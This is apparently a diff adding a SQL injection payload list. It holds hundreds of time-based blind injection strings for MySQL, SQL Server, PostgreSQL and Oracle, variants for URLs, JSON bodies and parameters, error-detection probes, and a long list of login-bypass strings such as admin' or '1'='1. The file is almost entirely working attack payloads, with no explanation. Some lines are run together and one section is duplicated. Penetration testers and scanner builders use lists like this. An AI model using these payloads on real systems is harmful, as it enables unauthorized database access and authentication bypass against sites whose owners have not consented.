@@ -1,0 +1,585 @@
+MySQL Blind (Time Based):
+
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(5),0)
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
+0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
+0'or(now()=sysdate()&&SLEEP(1))or'Zif(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate(),sleep(5),0))OR"/if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)"/if(1=1,sleep(5),0)/*'XOR(if(1=1,sleep(5),0))OR'"XOR(if(1=1,sleep(5),0))OR"*/if(1337=1337,exp(~(1)),0)/*'XOR(if(1337=1337,exp(~(1)),0))OR'"XOR(if(1337=1337,sleep(5),0))OR"*/SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/%2c(select%5*%5from%5(select(sleep(5)))a)
+(select(0)from(select(sleep(5)))v)
+(SELECT SLEEP(5))
+'%2b(select*from(select(sleep(5)))a)%2b'
+(select*from(select(sleep(5)))a)
+1'%2b(select*from(select(sleep(5)))a)%2b'
+,(select * from (select(sleep(5)))a)
+desc%2c(select*from(select(sleep(5)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A))(SELECT * FROM (SELECT(SLEEP(5)))YYYY)(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#(SELECT * FROM (SELECT(SLEEP(5)))YYYY)--'+(select*from(select(sleep(5)))a)+'(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*%2f(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*/(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'\"+(select(0)from(select(sleep(5)))v)+\"*/',''),/*test*/%26%26%09sLeEp(5)%09--+
+
+AND BLIND:
+
+1 and sleep 5--
+1 and sleep 5
+1 and sleep(5)--
+1 and sleep(5)
+' and sleep 5--
+' and sleep 5
+' and sleep 5 and '1'='1
+' and sleep(5) and '1'='1
+' and sleep(5)--
+' and sleep(5)
+' AnD SLEEP(5) ANd '1
+and sleep 5--
+and sleep 5
+and sleep(5)--
+and sleep(5)
+and SELECT SLEEP(5); #
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+' AND SLEEP(5)#
+" AND SLEEP(5)#
+') AND SLEEP(5)#
+
+OR BLIND:
+
+or sleep 5--
+or sleep 5
+or sleep(5)--
+or sleep(5)
+or SELECT SLEEP(5); #
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+' OR SLEEP(5)#
+" OR SLEEP(5)#
+') OR SLEEP(5)#
+')) or sleep(5)='
+" or sleep(5)#
+1) or sleep(5)#
+)) or sleep(5)='
+1)) or sleep(5)#
+or sleep(5)#
+%20'sleep%2050'
+%20$(sleep%2050)
+")) or sleep(5)="
+or sleep(5)='
+") or sleep(5)="
+) or sleep(5)='
+1 or sleep(5)#
+
+You can replace AND / OR
+
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('PBiy'='PBiy
+) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
+)) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((1337=1337
+))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((1337=1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)# 1337
+) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+1 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
++(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))+
+)) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+` WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+`) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+`=`1` AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND `1`=`1
+]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))|[1
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337'='1337
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337'='1337
+' AND (SELECT 3122 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337
+') AND (SELECT 4796 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337' LIKE '1337
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337' LIKE '1337
+%' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337%'='1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337' LIKE '1337
+") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ("1337"="1337
+")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (("1337"="1337
+"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((("1337"="1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND "1337"="1337
+") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ("1337" LIKE "1337
+")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (("1337" LIKE "1337
+"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((("1337" LIKE "1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND "1337" LIKE "1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) OR '1337'='1337
+') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+
+RLIKE BLIND:
+
+RLIKE SLEEP(5)--
+' RLIKE SLEEP(5)--
+' RLIKE SLEEP(5)-- 1337
+" RLIKE SLEEP(5)-- 1337
+') RLIKE SLEEP(5)-- 1337
+') RLIKE SLEEP(5) AND ('1337'='1337
+')) RLIKE SLEEP(5) AND (('1337'='1337
+'))) RLIKE SLEEP(5) AND ((('1337'='1337
+) RLIKE SLEEP(5)-- 1337
+) RLIKE SLEEP(5) AND (1337=1337
+)) RLIKE SLEEP(5) AND ((1337=1337
+))) RLIKE SLEEP(5) AND (((1337=1337
+1 RLIKE SLEEP(5)
+1 RLIKE SLEEP(5)-- 1337
+1 RLIKE SLEEP(5)# 1337
+) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+1 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
++(SELECT 1337 WHERE 1337=1337 RLIKE SLEEP(5))+
+)) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+` WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+`) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+' RLIKE SLEEP(5) AND '1337'='1337
+') RLIKE SLEEP(5) AND ('1337' LIKE '1337
+')) RLIKE SLEEP(5) AND (('1337' LIKE '1337
+'))) RLIKE SLEEP(5) AND ((('1337' LIKE '1337
+%' RLIKE SLEEP(5) AND '1337%'='1337
+' RLIKE SLEEP(5) AND '1337' LIKE '1337
+") RLIKE SLEEP(5) AND ("1337"="1337
+")) RLIKE SLEEP(5) AND (("1337"="1337
+"))) RLIKE SLEEP(5) AND ((("1337"="1337
+" RLIKE SLEEP(5) AND "1337"="1337
+") RLIKE SLEEP(5) AND ("1337" LIKE "1337
+")) RLIKE SLEEP(5) AND (("1337" LIKE "1337
+"))) RLIKE SLEEP(5) AND ((("1337" LIKE "1337
+" RLIKE SLEEP(5) AND "1337" LIKE "1337
+' RLIKE SLEEP(5) OR '1337'='1337
+') WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+") WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+' WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+" WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+
+ELT Blind:
+
+' AND ELT(1337=1337,SLEEP(5))--
+' AND ELT(1337=1337,SLEEP(5))-- 1337
+" AND ELT(1337=1337,SLEEP(5))-- 1337
+') AND ELT(1337=1337,SLEEP(5))-- 1337
+') AND ELT(1337=1337,SLEEP(5)) AND ('1337'='1337
+')) AND ELT(1337=1337,SLEEP(5)) AND (('1337'='1337
+'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337'='1337
+' AND ELT(1337=1337,SLEEP(5)) AND '1337'='1337
+') AND ELT(1337=1337,SLEEP(5)) AND ('1337' LIKE '1337
+')) AND ELT(1337=1337,SLEEP(5)) AND (('1337' LIKE '1337
+'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337' LIKE '1337
+) AND ELT(1337=1337,SLEEP(5))-- 1337
+) AND ELT(1337=1337,SLEEP(5)) AND (1337=1337
+)) AND ELT(1337=1337,SLEEP(5)) AND ((1337=1337
+))) AND ELT(1337=1337,SLEEP(5)) AND (((1337=1337
+1 AND ELT(1337=1337,SLEEP(5))
+1 AND ELT(1337=1337,SLEEP(5))-- 1337
+1 AND ELT(1337=1337,SLEEP(5))# 1337
+) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+1 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
++(SELECT 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+
+)) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+`) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+1`=`1` AND ELT(1337=1337,SLEEP(5)) AND `1`=`1
+]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))|[1
+%' AND ELT(1337=1337,SLEEP(5)) AND '1337%'='1337
+' AND ELT(1337=1337,SLEEP(5)) AND '1337' LIKE '1337
+") AND ELT(1337=1337,SLEEP(5)) AND ("1337"="1337
+")) AND ELT(1337=1337,SLEEP(5)) AND (("1337"="1337
+"))) AND ELT(1337=1337,SLEEP(5)) AND ((("1337"="1337
+" AND ELT(1337=1337,SLEEP(5)) AND "1337"="1337
+") AND ELT(1337=1337,SLEEP(5)) AND ("1337" LIKE "1337
+")) AND ELT(1337=1337,SLEEP(5)) AND (("1337" LIKE "1337
+"))) AND ELT(1337=1337,SLEEP(5)) AND ((("1337" LIKE "1337
+" AND ELT(1337=1337,SLEEP(5)) AND "1337" LIKE "1337
+' AND ELT(1337=1337,SLEEP(5)) OR '1337'='FMTE
+') WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+" WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+'||(SELECT 0x4c454f67 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
+'||(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
+'+(SELECT 0x4b6b486c WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+'
+||(SELECT 0x57556971 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||
+||(SELECT 0x67664847 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||
++(SELECT 0x74764164 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+
+')) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+
+BENCHMARK:
+
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND =BENCHMARK(5000000,MD5(0x774c5341))--
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337'='1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337'='1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337' LIKE '1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '1337
+%' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337%'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337' LIKE '1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337"="1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337"="1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337"="1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND "1337"="1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337" LIKE "1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337" LIKE "1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337" LIKE "1337
+" AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND "1337" LIKE "1337
+' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
+
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND =BENCHMARK(5000000,MD5(0x774c5341))--
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337'='1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337'='1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337' LIKE '1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '1337
+%' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337%'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337' LIKE '1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337"="1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337"="1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337"="1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND "1337"="1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337" LIKE "1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337" LIKE "1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337" LIKE "1337
+" AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND "1337" LIKE "1337
+' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
+
+Microsoft SQL Server Blind (Time Based):
+
+;waitfor delay '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+") IF (1=1) WAITFOR DELAY '0:0:5'--
+';%5waitfor%5delay%5'0:0:5'%5--%5
+' WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'
+or WAITFOR DELAY '0:0:5'--
+or WAITFOR DELAY '0:0:5'
+and WAITFOR DELAY '0:0:5'--
+and WAITFOR DELAY '0:0:5'
+WAITFOR DELAY '0:0:5'
+;WAITFOR DELAY '0:0:5'--
+;WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'-- 1337
+1' WAITFOR DELAY '0:0:5' AND '1337'='1337
+1') WAITFOR DELAY '0:0:5' AND ('1337'='1337
+1) WAITFOR DELAY '0:0:5' AND (1337=1337
+') WAITFOR DELAY '0:0:5'--
+" WAITFOR DELAY '0:0:5'--
+')) WAITFOR DELAY '0:0:5'--
+'))) WAITFOR DELAY '0:0:5'--
+%' WAITFOR DELAY '0:0:5'--
+") WAITFOR DELAY '0:0:5'--
+")) WAITFOR DELAY '0:0:5'--
+"))) WAITFOR DELAY '0:0:5'--
+1 waitfor delay '0:0:5'--
+1' waitfor delay '0:0:5'--
+
+Postgresql Blind (Time Based):
+
+";SELECT pg_sleep(5);
+;SELECT pg_sleep(5);
+and SELECT pg_sleep(5);
+1 SELECT pg_sleep(5);
+or SELECT pg_sleep(5);
+(SELECT pg_sleep(5))
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+' SELECT pg_sleep(5);
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))-- 1337
+1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337
+1') AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND ('1337'='1337
+1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (1337=1337
+or pg_sleep(5)--
+) or pg_sleep(5)--
+)) or pg_sleep(5)--
+
+Oracle Blind (Time Based):
+
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)
+1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- 1337
+' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337
+') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337) 
+AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND (1337=1337
+
+Generic Time Based SQL Injection Payloads:
+
+sleep(5)#
+(sleep 5)--
+(sleep 5)
+(sleep(5))--
+(sleep(5))
+-sleep(5)
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+";sleep 5--
+";sleep 5
+";sleep(5)--
+";sleep(5)
+";SELECT SLEEP(5); #
+1 SELECT SLEEP(5); #
++ SLEEP(5) + '
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+;sleep 5--
+;sleep 5
+;sleep(5)--
+;sleep(5)
+;SELECT SLEEP(5); #
+'&&SLEEP(5)&&'1
+' SELECT SLEEP(5); #
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+OR (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+RANDOMBLOB(500000000/2)
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+
+
+URL payloads:
+
+https://redact.com/page/if(now()=sysdate(),sleep(3),0)/"XOR(if(now()=sysdate(),sleep(3),0))OR"/
+https://redact.com/(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"
+https://redact.com/page/1 AnD SLEEP(5)
+https://redact.com/page/1' ORDER BY SLEEP(5)
+
+
+Json based:
+
+[-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))]
+{AnD SLEEP(5)}
+{1 AnD SLEEP(5)}
+{1' AnD SLEEP(5)--}
+{sleep 5}
+"emails":["AnD SLEEP(5)"]
+"emails":["test@gmail.com' OR SLEEP(5)#"]
+{"options":{"id":[],"emails":["AnD SLEEP(5)"],
+
+param:
+
+=1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='
+=1'XOR(if(now()=sysdate(),sleep(5),0))OR'
+=1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337   
+=1 or sleep(5)#
+=0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+=(select(0)from(select(sleep(5)))v)
+
+email=test@gmail.com' WAITFOR DELAY '0:0:5'--
+email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+
+
+Sql detection payload (Generic Error):
+
+'
+"
+"'
+' "
+'"
+'''
+.
+/
+\
+%5c
+%27
+%22
+%23
+%3B
+%27%22%60
+%22%27
+%27%20%22
+%27%22
+%27%27%27
+)
+")
+')
+))
+"))
+'))
+)))
+#
+;
+''
+`
+``
+,
+""
+//
+\\
+%
+%00
+||
+0.or-1%23
+'or-1%23
+%2F
+%5C
+%29
+%22%29
+%27%29
+%29%29
+%22%29%29
+%27%29%29
+%27%27
+%60
+%60%60
+%2C
+%22%22
+%2F%2F
+%5C%5C
+%7C%7C
+28 %
+%2A%7C
+//*
+%7C
+29 %
+(
+*/*
+|
+%'
+%"
+*
+*)(&
+*)(|(&
+*)(|(*
+*))%00
+-'
+
+SQL Injection Auth Bypass:
+
+'=' 'or'
+' or ''='
+/1#\
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+1'or'1'='1
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
